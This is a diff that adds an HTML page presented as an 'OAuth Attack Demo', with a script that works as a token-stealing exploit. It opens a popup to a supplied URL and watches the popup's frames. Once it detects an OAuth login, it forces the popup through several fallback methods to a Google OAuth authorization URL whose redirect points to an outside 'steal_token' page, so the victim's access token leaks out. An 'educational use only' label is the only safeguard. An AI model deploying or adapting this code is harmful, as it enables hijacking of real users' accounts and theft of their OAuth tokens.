@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>OAuth Monitoring Demo</title>
+  <style>
+    /* Background with gradient */
+    body {
+      height: 100vh;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(135deg, #1f1c2c, #928dab);
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      color: #fff;
+    }
+
+    /* Card container */
+    .container {
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      backdrop-filter: blur(10px);
+      padding: 30px;
+      text-align: center;
+      max-width: 420px;
+      animation: fadeIn 1s ease;
+    }
+
+    .container img {
+      width: 220px;
+      height: 220px;
+      object-fit: contain;
+      border-radius: 15px;
+      margin-bottom: 20px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4);
+    }
+
+    h1 {
+      font-size: 1.6rem;
+      margin-bottom: 15px;
+      letter-spacing: 1px;
+    }
+
+    p {
+      font-size: 0.95rem;
+      margin-bottom: 20px;
+      opacity: 0.85;
+    }
+
+    /* Modern button */
+    button {
+      padding: 12px 28px;
+      font-size: 1rem;
+      border: none;
+      border-radius: 30px;
+      background: linear-gradient(135deg, #00c6ff, #0072ff);
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 4px 15px rgba(0, 114, 255, 0.5);
+      transition: all 0.3s ease;
+    }
+
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 6px 20px rgba(0, 114, 255, 0.7);
+    }
+
+    /* Fade-in animation */
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://media.tenor.com/HQEVMrJMMI0AAAAi/cat-cat-tutu.gif" alt="demo gif">
+    <h1>OAuth Attack Demo</h1>
+    <p>This simulation monitors frames and attempts a redirect once OAuth is detected. For educational use only.</p>
+    <button onclick="launch()">▶ Launch Simulation</button>
+  </div>
+
+  <script>
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, "\\$&");
+        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
+
+    let foo;
+    let initialFrames = 0;
+    var urlParam = getParameterByName('url');
+    let attackOAuthURL = "https://accounts.google.com/o/oauth2/v2/auth?client_id=770783877544-3p0nfvbebbmh2h1r50vuighb1n8e34lu.apps.googleusercontent.com&redirect_uri=https://coop-exploit.vercel.app/steal_token.html&response_type=token&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile";
+    let oauthDetected = false;
+    let redirectAttempted = false;
+
+    function init() {
+        try {
+            initialFrames = foo.frames.length;
+            console.log("Initial Frame Count: " + initialFrames);
+            monitorFrames();
+            monitorWindowChanges();
+        } catch (e) {
+            console.log("Error accessing frame count.");
+            monitorWindowChanges();
+        }
+    }
+
+    function monitorFrames() {
+        if (!foo || foo.closed || redirectAttempted) {
+            console.log("Login window closed or redirect attempted, stopping attack.");
+            return;
+        }
+        try {
+            let currentFrames = foo.frames.length;
+            console.log("Current frames: " + currentFrames);
+            if (currentFrames == 2 && !oauthDetected) {
+                oauthDetected = true;
+                console.log("OAuth threshold reached! Starting advanced monitoring...");
+            }
+        } catch (e) {
+            console.log("Cross-origin frame monitoring...");
+            if (oauthDetected && !redirectAttempted) {
+                attemptRedirect("Cross-origin detected after OAuth threshold");
+            }
+        }
+        setTimeout(monitorFrames, 500);
+    }
+
+    function monitorWindowChanges() {
+        if (!foo || foo.closed || redirectAttempted) return;
+        try {
+            let windowName = foo.name;
+            let windowLength = foo.length;
+            console.log(`Window accessible: name=${windowName}, length=${windowLength}`);
+        } catch (e) {
+            console.log("Window property access blocked:", e.message);
+            if (oauthDetected && !redirectAttempted) {
+                attemptRedirect("Window access blocked after OAuth detection");
+            }
+        }
+        setTimeout(monitorWindowChanges, 300);
+    }
+
+    function attemptRedirect(reason) {
+        if (redirectAttempted) return;
+        redirectAttempted = true;
+        console.log(`Attempting redirect due to: ${reason}`);
+        setTimeout(() => {
+            try {
+                console.log("Method 1: location.replace");
+                foo.location.replace(attackOAuthURL);
+            } catch (e1) {
+                console.log("Method 1 failed:", e1.message);
+                try {
+                    console.log("Method 2: location.href");
+                    foo.location.href = attackOAuthURL;
+                } catch (e2) {
+                    console.log("Method 2 failed:", e2.message);
+                    try {
+                        console.log("Method 3: location assignment");
+                        foo.location = attackOAuthURL;
+                    } catch (e3) {
+                        console.log("All redirect methods failed:", e3.message);
+                        try {
+                            foo.postMessage({redirect: attackOAuthURL}, '*');
+                            console.log("Attempted postMessage redirect");
+                        } catch (e4) {
+                            console.log("PostMessage also failed:", e4.message);
+                        }
+                    }
+                }
+            }
+        }, 100);
+    }
+
+    function launch() {
+        foo = window.open(urlParam, "foo", "width=500,height=600");
+        setTimeout(init, 2000);
+    }
+  </script>
+</body>
+</html>
